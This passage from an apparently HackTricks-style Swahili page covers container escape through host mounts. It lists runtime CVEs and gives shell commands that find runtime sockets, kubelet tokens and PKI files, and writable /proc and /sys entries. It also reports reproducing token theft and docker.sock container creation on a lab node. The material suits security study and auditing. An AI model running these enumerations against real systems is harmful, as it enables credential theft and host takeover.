- `CVE-2024-21626` katika `runc`, ambapo file descriptor iliyovuja ya directory ingeweza kuweka directory ya kufanya kazi kwenye filesystem ya host.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo Dockerfile hasidi, frontend, na mtiririko wa `RUN --mount` ungeweza kurejesha ufikiaji wa faili za host, ufutaji, au mamlaka yaliyoinuliwa wakati wa builds.
- `CVE-2024-1753` katika mtiririko wa builds wa Buildah na Podman, ambapo bind mount zilizoundwa mahsusi wakati wa build zingeweza kufichua `/` kwa ruhusa ya kusoma na kuandika.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa kufungua image ingeweza kuruhusu image iliyoundwa mahsusi kurekebisha filesystem ya host wakati wa pull.

CVE hizi ni muhimu hapa kwa sababu zinaonyesha kuwa ushughulikiaji wa mount hauhusu tu usanidi wa operator. Runtime yenyewe pia inaweza kuanzisha hali za kutoroka zinazotokana na mount.

## Ukaguzi

Tumia amri hizi kupata haraka mount zilizo hatarishi zaidi:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Mambo ya kuvutia hapa:

- Root ya host, `/proc`, `/sys`, `/var`, na runtime sockets zote ni matokeo yenye kipaumbele cha juu.
- Maingizo ya proc/sys yanayoweza kuandikwa mara nyingi humaanisha kuwa mount inaonyesha vidhibiti vya kernel vinavyohusu host nzima badala ya mwonekano salama wa container.
- Njia za `/var` zilizowekwa kwenye mount zinahitaji ukaguzi wa credentials na workloads jirani, si ukaguzi wa mfumo wa faili pekee.
- Saraka za hali ya Kubelet na njia za CNI/plugin zinapaswa kupewa kipaumbele sawa na runtime sockets kwa sababu mara nyingi ziko moja kwa moja kwenye njia ya node ya kuunda pods na kusambaza credentials.

## Hali ya Uthibitishaji wa Ndani

Minyororo ya vitendo kwenye ukurasa huu ilikaguliwa dhidi ya node ya Linux minikube ya ndani. Uthibitishaji huo ulizalisha tena:

- ufikiaji wa kusoma na kuandika kupitia hostPath ya muda inayoweza kuandikwa
- ugunduzi wa tokeni za ServiceAccount zilizowekwa na Secrets zilizowekwa kupitia `/var/lib/kubelet/pods`
- uthibitishaji uliofanikiwa wa Kubernetes API kwa kutumia tokeni halali iliyopatikana kutoka kwenye hali hiyo ya kubelet iliyowekwa
- ugunduzi wa kusoma pekee wa mfumo wa faili wa `overlay2` wa Docker jirani kupitia `/var` iliyowekwa
- uundaji wa container nyingine na Docker API, ikiwa na host bind ya kusoma pekee kupitia `docker.sock` iliyowekwa
- utekelezaji wa host uliocheleweshwa kupitia hook ya muda inayotumiwa na host
- uigaji wa CNI-wrapper uliohifadhi hoja, ingizo sanifu, na utekelezaji wa plugin ya awali

Node hiyo hiyo ilifichua `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, na `config.gz`, lakini haikufichua `uevent_helper`, vigezo vya EFI, maingizo ya thermal, au `sched_debug`. Vichochezi vya kernel vinavyoharibu havikutekelezwa. Hii inathibitisha kuwa minyororo ya host-root, `/var`, hali ya kubelet, socket, na host-consumer inaweza kuzalishwa tena; ilhali mbinu za procfs/sysfs helper lazima zibaki kutegemea kernel husika, hali ya mount, njia ya payload, na kichochezi.

## References

- [1] [Faili na Njia za Ndani Zinazotumiwa na Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Kontena la cilium-agent linaweza kufikia host kupitia mount ya `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
